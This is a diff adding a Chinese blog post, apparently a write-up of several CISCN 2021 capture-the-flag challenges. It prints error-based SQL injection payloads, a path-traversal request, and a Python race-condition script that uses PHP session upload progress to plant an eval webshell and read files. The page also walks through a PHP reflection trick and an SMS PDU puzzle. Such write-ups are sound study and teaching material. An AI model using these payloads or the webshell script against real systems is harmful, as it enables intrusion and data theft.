@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="一个彩笔">
+  <meta name="author" content="dWm2">
+  <meta name="keywords" content="dWm2">
+  <title>第十四届全国大学生信息安全竞赛部分wp ~ dWm2&#39;s Blog</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>dWm2's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/2.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Tuesday, May 18th 2021, 12:00 am
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    829 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      4 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="fas fa-angle-down scroll-down-arrow"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h1 id="第十四届全国大学生信息安全竞赛部分wp"><a href="#第十四届全国大学生信息安全竞赛部分wp" class="headerlink" title="第十四届全国大学生信息安全竞赛部分wp"></a>第十四届全国大学生信息安全竞赛部分wp</h1><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>进来是个登录界面，sqlmap能跑出部分信息。</p>
+<p>fuzz后发现过滤</p>
+<pre><code>union
+information
+column
+inno</code></pre><p>无列名注入</p>
+<p>注列名</p>
+<p>payload</p>
+<pre><code>uname=123&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag as a join flag as b using(id)as c),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95</code></pre><p>得到no字段。</p>
+<p>注字段名</p>
+<p>Payload:</p>
+<pre><code>uname=123&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag as a join flag as b using(id,no))as c),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95</code></pre><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" srcset="/img/loading.gif" alt="图形用户界面, 应用程序  描述已自动生成"></p>
+<p>再通过字段名去注flag。得到后半截。</p>
+<p>Payload：</p>
+<pre><code>uname=123123&#39;) and (extractvalue(1,concat(0x7e,(select SUBSTRING(`f8ccfe58-fdc5-4641-b5b4-3448403d1ffe`,10,32) from flag),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%</code></pre><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序  描述已自动生成"></p>
+<p>改一下获得后半截flag。</p>
+<p>Payload：</p>
+<pre><code>uname=123123&#39;) and (extractvalue(1,concat(0x7e,(select SUBSTRING(`f8ccfe58-fdc5-4641-b5b4-3448403d1ffe`,1,10) from flag),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%</code></pre><p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本  描述已自动生成"></p>
+<h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>原题 = =</p>
+<p>进来啥也没有，扫后台得到源码.index.php.swo。</p>
+<pre class=" language-php"><code class="language-php">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">User</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">i</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">j</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">k</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">l</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">m</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">n</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">o</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">t</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token operator">++</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token variable">$rc</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"rc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$rb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"rb"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$ra</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ra"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$rd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"rd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$method</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$rc</span><span class="token punctuation">(</span><span class="token variable">$ra</span><span class="token punctuation">,</span> <span class="token variable">$rb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$rd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>–&gt;php反射</p>
+<p>参数是：?rc=ReflectionMethod&amp;ra=User&amp;rb=x&amp;rd=getDocComment</p>
+<p>由于不知道rb是什么，进行a-z爆破</p>
+<p>爆出来是q，回显得到flag。</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序, 电子邮件  描述已自动生成"></p>
+<h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>扫描后台发现.listing文件，得到新文件.listing</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" srcset="/img/loading.gif" alt="img"></p>
+<pre><code>Post cf=..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fyou_can_seeeeeeee_me.php</code></pre><p>目录穿越得到phpinfo,得到session文件的绝对路径/var/lib/php/sessions/dfdcdhgbfc。</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序, 电子邮件  描述已自动生成"></p>
+<p>利用session.upload_progress进行文件包含，根据提示用条件竞争查看/etc下目录</p>
+<p>下面是jio本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> io
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> threading
+<span class="token comment" spellcheck="true">#var_dump(scandir('/etc/iigbdccdij/dfajiafcea/gddfeeafaf/hahcdhbgfd/gbidbdefde/fl444444g'));</span>
+sessid <span class="token operator">=</span> <span class="token string">'flag'</span>
+datas <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cf"</span><span class="token punctuation">:</span><span class="token string">"../../../../var/lib/php/sessions/dfdcdhgbfc/sess_flag"</span><span class="token punctuation">,</span><span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"echo file_get_contents('/etc/iigbdccdij/dfajiafcea/gddfeeafaf/hahcdhbgfd/gbidbdefde/fl444444g');"</span><span class="token punctuation">}</span>
+url <span class="token operator">=</span> <span class="token string">"http://124.70.14.200:22355/"</span>
+headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span><span class="token punctuation">}</span>
+
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>
+        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>
+            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
+            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+            files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'ff.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>datas<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'ff.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+</code></pre>
+<p>然后就是套娃，套到最后得到fl444444g。</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" srcset="/img/loading.gif" alt="文本  描述已自动生成"></p>
+<p>读文件得到flag。</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" srcset="/img/loading.gif" alt="img"></p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" srcset="/img/loading.gif" alt="img"></p>
+<h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><p>根据密文格式推测为短信PDU</p>
+<p>用在线工具解码</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg" srcset="/img/loading.gif" alt="文本  中度可信度描述已自动生成"></p>
+<p>第二段密文提示手机号前八位 – 15030442</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg" srcset="/img/loading.gif" alt="手机屏幕截图  描述已自动生成"></p>
+<p>继续往下解</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg" srcset="/img/loading.gif" alt="文本  描述已自动生成"></p>
+<p>下面全是这样的数据段，手撸把所有密文解出来。</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg" srcset="/img/loading.gif" alt="图形用户界面, 文本, 应用程序, 聊天或短信  描述已自动生成"></p>
+<p>最后按时间顺序拼成(笨比方法)</p>
+<p><img src="file:///C:/Users/12986/AppData/Local/Temp/msohtmlclip1/01/clip_image031.jpg" srcset="/img/loading.gif" alt="文本  描述已自动生成"></p>
+<p>和前面的电话号连一起</p>
+<p>CISCN{15030442_b586_4c9e_b436_26def12293e4}</p>
+<p>得到flag。</p>
+<p> 有脚本能直接排列 = = 找不着了</p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+              <span>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/WP">WP</a>
+                  &nbsp;
+                
+              </span>&nbsp;&nbsp;
+            
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  <!-- cnzz Analytics -->
+  
+
+
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "第十四届全国大学生信息安全竞赛部分wp&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
